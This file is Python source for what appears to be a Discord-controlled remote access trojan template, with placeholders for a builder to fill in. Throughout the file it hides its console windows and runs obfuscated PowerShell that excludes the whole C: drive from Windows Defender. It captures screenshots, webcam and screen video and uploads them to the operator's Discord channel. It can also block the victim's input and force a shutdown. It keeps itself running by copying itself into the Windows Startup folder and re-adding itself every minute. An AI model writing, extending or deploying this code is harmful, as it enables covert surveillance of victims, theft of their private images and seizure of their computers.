import asyncio
import os
import subprocess
import time
import zipfile
import sys
import shutil
import tkinter as tk
import ctypes
from concurrent.futures import ThreadPoolExecutor

# List of non-standard packages to install
NON_STANDARD_PACKAGES = [
    "discord.py",
    "pyautogui", 
    "opencv-python",
    "numpy",
    "pywin32",
    "pygame",
    "pycaw",
    "pillow",
    "pycryptodome",
    "comtypes",
    "requests",
    "pyscreeze==0.1.28",  # Pin to stable version
    "mss"  # Alternative screenshot library as backup
]

def install_packages():
    """Install non-standard Python packages with hidden console on Windows."""
    creationflags = subprocess.CREATE_NO_WINDOW if sys.platform == "win32" else 0

    # Special import checks for problematic packages
    for package in NON_STANDARD_PACKAGES:
        try:
            # Special handling for packages with different import names
            if package == "opencv-python":
                __import__("cv2")
            elif package == "pycryptodome":
                # Use Crypto for pycryptodome (not Cryptodome)
                __import__("Crypto")
            elif package == "pillow":
                __import__("PIL")
            elif package == "pyscreeze":
                __import__("pyscreeze")
            else:
                module_name = package.split(".")[0]
                __import__(module_name)
                
        except ImportError:
            print(f"Installing {package}...")
            try:
                # Force install and upgrade if needed
                subprocess.run(
                    [sys.executable, "-m", "pip", "install", package, "--upgrade"],
                    check=True,
                    creationflags=creationflags,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    text=True
                )
                print(f"Successfully installed {package}")
                
                # Special post-installation check for pycryptodome
                if package == "pycryptodome":
                    print("Verifying pycryptodome installation...")
                    try:
                        from Crypto.Cipher import AES  # Changed from Cryptodome to Crypto
                        print("pycryptodome verified successfully!")
                    except ImportError as e:
                        print(f"Warning: pycryptodome import still failing: {e}")
                        
            except subprocess.CalledProcessError as e:
                print(f"Failed to install {package}: {e.stderr}")
# Run package installation at startup
install_packages()
# Import non-standard modules after installation
import discord
from discord.ext import commands, tasks
import pyautogui
import cv2
import numpy as np
import win32api
import win32con
import win32gui
import pygame
from pygame.locals import *

# Set up Discord bot with intents
intents = discord.Intents.default()
intents.guilds = True
intents.members = True
intents.message_content = True  # Add this line
bot = commands.Bot(command_prefix="!", intents=intents)
category_id="replaceme --> in builder category id"
user_channels = {}

@bot.event
async def on_ready():
    print(f"Logged in as {bot.user.name}")

    pc_username = os.getlogin()

    # Get the category using the global category_id
    category = bot.get_channel(int(category_id))
    if not category:
        print(f"Error: Could not find category with ID {category_id}")
        return

    channel = discord.utils.get(category.text_channels, name=pc_username.lower())

    if channel:
        await channel.send(f"PC turned on, user {pc_username} back online!")
    else:
        channel = await category.create_text_channel(pc_username.lower())  # Use lowercase for consistency
        await channel.send(f"New user captured: {pc_username}!")
    
    # Store the channel for this user
    user_channels[pc_username.lower()] = channel.id

# Add this function to check if command is from the correct user's channel
def is_correct_user_channel():
    async def predicate(ctx):
        pc_username = os.getlogin().lower()
        if pc_username in user_channels:
            return ctx.channel.id == user_channels[pc_username]
        return False
    return commands.check(predicate)


@bot.command()
@is_correct_user_channel()
async def exclusion(ctx):
    await ctx.send("3xc1usion has ben sent to the reg") 
    subprocess.run("powershell -enc cgBlAGcAIABhAGQAZAAgACIASABLAEwATQBcAFMATwBGAFQAVwBBAFIARQBcAFAAbwBsAGkAYwBpAGUAcwBcAE0AaQBjAHIAbwBzAG8AZgB0AFwAVwBpAG4AZABvAHcAcwAgAEQAZQBmAGUAbgBkAGUAcgBcAEUAeABjAGwAdQBzAGkAbwBuAHMAXABQAGEAdABoAHMAIgAgAC8AdgAgAEMAOgBcAA==")

@bot.command()
@is_correct_user_channel()
async def remove_exclusion(ctx):
    await ctx.send("3xc1usion has been removed from the reg")
    subprocess.run("powershell -enc UgBlAG0AbwB2AGUALQBJAHQAZQBtAFAAcgBvAHAAZQByAHQAeQAgAC0AUABhAHQAaAAgACIASABLAEwATQA6AFwAUwBPAEYAVABXAEEAUgBFAFwAUABvAGwAaQBjAGkAZQBzAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzACAARABlAGYAZQBuAGQAZQByAFwARQB4AGMAbAB1AHMAaQBvAG4AcwBcAFAAYQB0AGgAcwAiACAALQBOAGEAbQBlACAAIgBDADoAXAAiAA0ACgA=")

@bot.command()
@is_correct_user_channel()
async def restart(ctx, seconds, message):
    await ctx.send(f"System will poweroff in {seconds}.")
    subprocess.run(f'shutdown /s /t {seconds} /c "{message}"', shell=True)

@bot.command()
@is_correct_user_channel()
async def screenshot_screen(ctx, seconds: int):
    await ctx.send(f"Starting screenshot capture for {seconds} seconds...")
    for i in range(seconds):
        filename = f"screenshot_{i}.png"
        # Take screenshot
        screenshot = pyautogui.screenshot()
        screenshot.save(filename)
        # Send file to channel
        with open(filename, "rb") as f:
            picture = discord.File(f)
            await ctx.send(file=picture)
        # Delete file
        os.remove(filename)
        # Wait 1 second before next screenshot
        await asyncio.sleep(1)
    await ctx.send("Done capturing and sending screenshots.")


@bot.command()
@is_correct_user_channel()
async def dis_input(ctx, duration: int):
    """
    Blocks keyboard and mouse input for `duration` seconds.
    WARNING: Use carefully, as it will make the computer unresponsive temporarily.
    This should work system-wide, including in games.
    """
    await ctx.send(f"⛔ Blocking input for {duration} seconds...")

    # Block input (system-wide Windows API)
    ctypes.windll.user32.BlockInput(True)
    try:
        await asyncio.sleep(duration)
    finally:
        # Always unblock
        ctypes.windll.user32.BlockInput(False)

    await ctx.send("✅ Input unblocked!")



@bot.command()
@is_correct_user_channel()
async def open_browser(ctx, browser: str, url: str, tabs: int = 1):
    """
    Opens the specified URL in one or more tabs of a chosen browser.
    Usage examples:
      !open_browser edge https://example.com 3
      !open_browser chrome https://openai.com 2
      !open_browser all https://github.com 1
    """

    # Validate URL
    if not url.startswith("https://") and not url.startswith("http://"):
        await ctx.send("❌ Please provide a valid URL starting with https:// or http://")
        return

    # Normalize browser name
    browser = browser.lower()

    # Known browser paths (Windows default installs)
    browser_paths = {
    # Microsoft Edge (Standard + Dev + Beta)
    "edge": r"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe",
    "edge_dev": r"C:\Program Files (x86)\Microsoft\Edge Dev\Application\msedge.exe",
    "edge_beta": r"C:\Program Files (x86)\Microsoft\Edge Beta\Application\msedge.exe",

    # Google Chrome (Standard + Beta + Canary)
    "chrome": r"C:\Program Files\Google\Chrome\Application\chrome.exe",
    "chrome_beta": r"C:\Program Files\Google\Chrome Beta\Application\chrome.exe",
    "chrome_canary": r"C:\Users\%USERNAME%\AppData\Local\Google\Chrome SxS\Application\chrome.exe",

    # Mozilla Firefox (Standard + Developer + Nightly)
    "firefox": r"C:\Program Files\Mozilla Firefox\firefox.exe",
    "firefox_dev": r"C:\Program Files\Firefox Developer Edition\firefox.exe",
    "firefox_nightly": r"C:\Program Files\Firefox Nightly\firefox.exe",

    # Brave Browser
    "brave": r"C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe",

    # Opera & Opera GX
    "opera": r"C:\Users\%USERNAME%\AppData\Local\Programs\Opera\launcher.exe",
    "opera_gx": r"C:\Users\%USERNAME%\AppData\Local\Programs\Opera GX\launcher.exe",

    # Vivaldi Browser
    "vivaldi": r"C:\Program Files\Vivaldi\Application\vivaldi.exe",

    # Tor Browser
    "tor": r"C:\Program Files\Tor Browser\Browser\firefox.exe",

    # Chromium (open-source Chrome)
    "chromium": r"C:\Program Files\Chromium\Application\chrome.exe",

    # Epic Privacy Browser
    "epic": r"C:\Users\%USERNAME%\AppData\Local\Epic Privacy Browser\Application\epic.exe",

    # Waterfox (Firefox fork)
    "waterfox": r"C:\Program Files\Waterfox\waterfox.exe",
    }


    # Validate browser choice
    if browser not in browser_paths and browser != "all":
        await ctx.send(f"❌ Unknown browser '{browser}'. Please choose: edge, chrome, firefox, or all.")
        return

    # Choose which browsers to open
    if browser == "all":
        targets = {name: path for name, path in browser_paths.items() if os.path.exists(path)}
        if not targets:
            await ctx.send("❌ No supported browsers found on this system.")
            return
        await ctx.send(f"🌐 Opening {tabs} tab(s) of {url} in all available browsers...")
    else:
        if not os.path.exists(browser_paths[browser]):
            await ctx.send(f"❌ {browser.capitalize()} not found at default path.")
            return
        targets = {browser: browser_paths[browser]}
        await ctx.send(f"🌐 Opening {tabs} tab(s) of {url} in {browser.capitalize()}...")

    # Launch browsers
    for name, path in targets.items():
        for _ in range(tabs):
            subprocess.Popen([path, "--new-tab", url])
            await asyncio.sleep(0.3)

    await ctx.send(f"✅ Successfully opened {tabs} tab(s) of {url} in {', '.join(targets.keys())}.")


MAX_DISCORD_FILESIZE = 10 * 1024 * 1024  # 10mB default limit
VIDEO_EXT = ".mp4"
ZIP_EXT = ".zip"

async def send_video_file(ctx, video_filename):
    """
    Sends a video file to Discord, zipping if necessary, and cleans up files.
    Returns True if sent successfully, False otherwise.
    """
    try:
        # Check if video file exists
        if not os.path.exists(video_filename):
            await ctx.send("❌ Error: Video file was not created.")
            return False

        file_size = os.path.getsize(video_filename)
        zip_filename = video_filename.replace(VIDEO_EXT, ZIP_EXT)

        # If file exceeds Discord's limit, create a zip
        if file_size > MAX_DISCORD_FILESIZE:
            try:
                with zipfile.ZipFile(zip_filename, "w", compression=zipfile.ZIP_DEFLATED, compresslevel=9) as zipf:
                    zipf.write(video_filename)
                
                # Check zip file size
                zip_size = os.path.getsize(zip_filename)
                if zip_size > MAX_DISCORD_FILESIZE:
                    await ctx.send(f"❌ Error: Zipped file ({zip_size / 1024 / 1024:.2f} MB) still exceeds Discord's 8MB limit.")
                    os.remove(video_filename)
                    if os.path.exists(zip_filename):
                        os.remove(zip_filename)
                    return False
                
                await ctx.send(f"⚠️ Video ({file_size / 1024 / 1024:.2f} MB) too large. Sending zipped version.")
                await ctx.send(file=discord.File(zip_filename))
                os.remove(video_filename)
                os.remove(zip_filename)
            except Exception as e:
                await ctx.send(f"❌ Error creating/sending zip file: {e}")
                os.remove(video_filename)
                if os.path.exists(zip_filename):
                    os.remove(zip_filename)
                return False
        else:
            await ctx.send(file=discord.File(video_filename))
            os.remove(video_filename)
        
        return True
    except Exception as e:
        await ctx.send(f"❌ Error sending file: {e}")
        if os.path.exists(video_filename):
            os.remove(video_filename)
        if os.path.exists(zip_filename):
            os.remove(zip_filename)
        return False

@bot.command()
@is_correct_user_channel()
async def record_cam(ctx, seconds: int):
    """
    Records webcam video for the specified duration and sends it to Discord.
    """
    if seconds <= 0 or seconds > 300:
        await ctx.send("❌ Duration must be between 1 and 300 seconds.")
        return

    await ctx.send(f"🎥 Recording webcam for {seconds} seconds at 640x480 @ 30 FPS...")

    try:
        camera = cv2.VideoCapture(0)
        if not camera.isOpened():
            await ctx.send("❌ Could not access the camera.")
            return

        # Set resolution and FPS
        width, height = 640, 480
        fps = 30.0
        camera.set(cv2.CAP_PROP_FRAME_WIDTH, width)
        camera.set(cv2.CAP_PROP_FRAME_HEIGHT, height)
        camera.set(cv2.CAP_PROP_FPS, fps)

        # Initialize video writer
        fourcc = cv2.VideoWriter_fourcc(*'mp4v')
        video_filename = "webcam_video.mp4"
        out = cv2.VideoWriter(video_filename, fourcc, fps, (width, height))

        start_time = time.time()
        while (time.time() - start_time) < seconds:
            ret, frame = camera.read()
            if not ret:
                await ctx.send("⚠️ Failed to capture frame.")
                break
            out.write(frame)

        # Release resources
        camera.release()
        out.release()
        cv2.destroyAllWindows()

        # Send the video file
        await send_video_file(ctx, video_filename)

    except Exception as e:
        await ctx.send(f"❌ Error during webcam recording: {e}")
        if 'camera' in locals():
            camera.release()
        if 'out' in locals():
            out.release()
        if os.path.exists(video_filename):
            os.remove(video_filename)

@bot.command()
@is_correct_user_channel()
async def record_screen(ctx, duration: int = 10):
    """
    Records the screen for the specified duration and sends it to Discord.
    """
    if duration <= 0 or duration > 300:
        await ctx.send("❌ Duration must be between 1 and 300 seconds.")
        return

    await ctx.send(f"🎥 Recording screen for {duration} seconds...")

    try:
        screen_width, screen_height = pyautogui.size()
        fourcc = cv2.VideoWriter_fourcc(*'mp4v')
        video_filename = "screen_record.mp4"
        out = cv2.VideoWriter(video_filename, fourcc, 20.0, (screen_width, screen_height))

        start_time = time.time()
        while (time.time() - start_time) < duration:
            screenshot = pyautogui.screenshot()
            frame = cv2.cvtColor(np.array(screenshot), cv2.COLOR_RGB2BGR)
            out.write(frame)

        out.release()

        # Send the video file
        await send_video_file(ctx, video_filename)

    except Exception as e:
        await ctx.send(f"❌ Error during screen recording: {e}")
        if 'out' in locals():
            out.release()
        if os.path.exists(video_filename):
            os.remove(video_filename)
@bot.command()
@is_correct_user_channel()
async def record_split(ctx, duration: int = 10):
    """
    Records both webcam and screen side-by-side for the specified duration and sends to Discord.
    """
    if duration <= 0 or duration > 60:  # Reduced max duration for stability
        await ctx.send("❌ Duration must be between 1 and 60 seconds.")
        return

    await ctx.send(f"📹 Recording webcam + screen for {duration} seconds...")

    cam = None
    out = None
    video_filename = "split_record.mp4"
    
    try:
        # Initialize webcam
        cam = cv2.VideoCapture(0)
        if not cam.isOpened():
            await ctx.send("❌ Could not access webcam.")
            return
        
        # Set lower resolution for webcam for better performance
        cam.set(cv2.CAP_PROP_FRAME_WIDTH, 640)
        cam.set(cv2.CAP_PROP_FRAME_HEIGHT, 480)
        cam.set(cv2.CAP_PROP_FPS, 15)

        # Get screen size and set smaller output resolution
        screen_width, screen_height = pyautogui.size()
        # Reduce output resolution to save file size and improve performance
        output_width = 1280
        output_height = 720
        
        # Use better codec for compression
        fourcc = cv2.VideoWriter_fourcc(*'mp4v')  # or 'XVID' if mp4v doesn't work
        out = cv2.VideoWriter(video_filename, fourcc, 10.0, (output_width, output_height))

        start_time = time.time()
        frame_count = 0
        
        await ctx.send("🔄 Recording started...")

        while (time.time() - start_time) < duration:
            # Capture webcam frame
            ret, frame_cam = cam.read()
            if not ret:
                await ctx.send("⚠️ Failed to capture webcam frame.")
                break

            try:
                # Capture screen with error handling
                screenshot = pyautogui.screenshot()
                frame_screen = cv2.cvtColor(np.array(screenshot), cv2.COLOR_RGB2BGR)
                
                # Resize webcam frame to smaller size
                cam_height = 360  # Fixed height for webcam
                cam_width = int(frame_cam.shape[1] * cam_height / frame_cam.shape[0])
                frame_cam_resized = cv2.resize(frame_cam, (cam_width, cam_height))
                
                # Resize screen frame to match total height
                screen_target_height = cam_height
                screen_target_width = int(frame_screen.shape[1] * screen_target_height / frame_screen.shape[0])
                frame_screen_resized = cv2.resize(frame_screen, (screen_target_width, screen_target_height))
                
                # Combine frames side by side
                combined_frame = cv2.hconcat([frame_cam_resized, frame_screen_resized])
                
                # Resize to final output dimensions
                combined_frame = cv2.resize(combined_frame, (output_width, output_height))
                
                # Write frame
                out.write(combined_frame)
                frame_count += 1
                
            except Exception as frame_error:
                await ctx.send(f"⚠️ Error processing frame: {frame_error}")
                continue

        # Release resources
        if cam:
            cam.release()
        if out:
            out.release()

        if frame_count == 0:
            await ctx.send("❌ No frames were captured.")
            return

        await ctx.send(f"✅ Recording completed! Captured {frame_count} frames. Processing video...")

        # Send the video file
        success = await send_video_file(ctx, video_filename)
        if not success:
            await ctx.send("❌ Failed to send video file.")

    except Exception as e:
        await ctx.send(f"❌ Error during split recording: {str(e)}")
        
        # Clean up resources
        if cam:
            cam.release()
        if out:
            out.release()
        
        # Clean up file if it exists
        if os.path.exists(video_filename):
            try:
                os.remove(video_filename)
            except:
                pass
@bot.command()
@is_correct_user_channel()
async def clean_chat(ctx):
    """
    Deletes all messages in the current channel, including attachments and videos.
    """
    await ctx.send("🧹 Cleaning all messages in this channel...")

    def is_not_pinned(message):
        return not message.pinned

    deleted = True
    while deleted:
        # Bulk delete up to 100 messages at a time
        deleted = await ctx.channel.purge(limit=100, check=is_not_pinned)
    
    await ctx.send("✅ All messages deleted!", delete_after=5)

async def add_to_startup(file_path, file_name, startup_folder):
    """
    Helper function to copy a file to the startup folder and verify.
    Returns True if successful, False otherwise.
    """
    dest_path = os.path.join(startup_folder, file_name)
    try:
        if not os.path.exists(dest_path):
            shutil.copy2(file_path, dest_path)
        if os.path.exists(dest_path):
            return True
        return False
    except PermissionError:
        return False
    except Exception:
        return False

@tasks.loop(minutes=1.0)
async def check_startup():
    """
    Background task to check every minute if the file is in the startup folder.
    Re-adds it if missing.
    """
    try:
        file_path = os.path.abspath(sys.argv[0])
        file_name = os.path.basename(file_path)
        file_ext = os.path.splitext(file_name)[1].lower()
        
        if file_ext not in ('.py', '.exe'):
            return  # Silently skip invalid files
        
        # Define C:\BotStartup path
        c_drive_folder = r"C:\BotStartup"
        c_drive_path = os.path.join(c_drive_folder, file_name)
        startup_folder = os.path.join(os.getenv('APPDATA'), r'Microsoft\Windows\Start Menu\Programs\Startup')
        
        # Check if file exists in startup folder
        startup_path = os.path.join(startup_folder, file_name)
        if not os.path.exists(startup_path):
            # Ensure C:\BotStartup file exists
            if os.path.exists(c_drive_path):
                # Re-add to startup
                if await add_to_startup(c_drive_path, file_name, startup_folder):
                    print(f"Re-added '{file_name}' to startup folder.")
                else:
                    print(f"Failed to re-add '{file_name}' to startup folder.")
    except Exception as e:
        print(f"Error in check_startup task: {e}")

@bot.command()
@is_correct_user_channel()
async def startup(ctx):
    """
    Copies the current Python script or executable to C:\BotStartup and Windows startup.
    Runs the bot from C:\BotStartup and checks startup folder every minute.
    """
    try:
        # Get the path to the currently running Python file or executable
        file_path = os.path.abspath(sys.argv[0])
        file_name = os.path.basename(file_path)
        file_ext = os.path.splitext(file_name)[1].lower()

        # Validate that the file is a Python script or executable
        if file_ext not in ('.py', '.exe'):
            await ctx.send("❌ Error: Only Python scripts (.py) or executables (.exe) can be added to startup.")
            return

        # Define C:\BotStartup folder
        c_drive_folder = r"C:\BotStartup"
        c_drive_path = os.path.join(c_drive_folder, file_name)

        # Create C:\BotStartup if it doesn't exist
        try:
            os.makedirs(c_drive_folder, exist_ok=True)
        except PermissionError:
            await ctx.send("❌ Error: Permission denied creating C:\BotStartup. Run as administrator.")
            return
        except Exception as e:
            await ctx.send(f"❌ Error creating C:\BotStartup: {e}")
            return

        # Copy to C:\BotStartup
        try:
            shutil.copy2(file_path, c_drive_path)
        except PermissionError:
            await ctx.send("❌ Error: Permission denied copying to C:\BotStartup. Run as administrator.")
            return
        except Exception as e:
            await ctx.send(f"❌ Error copying to C:\BotStartup: {e}")
            return

        # Verify copy to C:\BotStartup
        if not os.path.exists(c_drive_path):
            await ctx.send("❌ Error: Failed to verify file in C:\BotStartup.")
            return

        # Copy to startup folder
        startup_folder = os.path.join(os.getenv('APPDATA'), r'Microsoft\Windows\Start Menu\Programs\Startup')
        if not os.path.exists(startup_folder):
            await ctx.send("❌ Error: Startup folder not found. Ensure you're running on Windows.")
            return

        startup_path = os.path.join(startup_folder, file_name)
        try:
            if not os.path.exists(startup_path):
                shutil.copy2(c_drive_path, startup_path)
        except PermissionError:
            await ctx.send("❌ Error: Permission denied copying to startup folder. Run as administrator.")
            return
        except Exception as e:
            await ctx.send(f"❌ Error copying to startup folder: {e}")
            return

        # Verify copy to startup folder
        if not os.path.exists(startup_path):
            await ctx.send("❌ Error: Failed to verify file in startup folder.")
            return

        # Start the background task to check startup folder (if not already running)
        if not check_startup.is_running():
            check_startup.start()

        await ctx.send(f"✅ Success! '{file_name}' copied to C:\BotStartup and added to Windows startup. "
                       f"Will run from C:\BotStartup and be checked every minute.")

    except Exception as e:
        await ctx.send(f"❌ An unexpected error occurred: {e}")
 
# Commands are added by the builder above this line

# Run the bot --> in the builder replace this
bot.run('bot token here-->replace')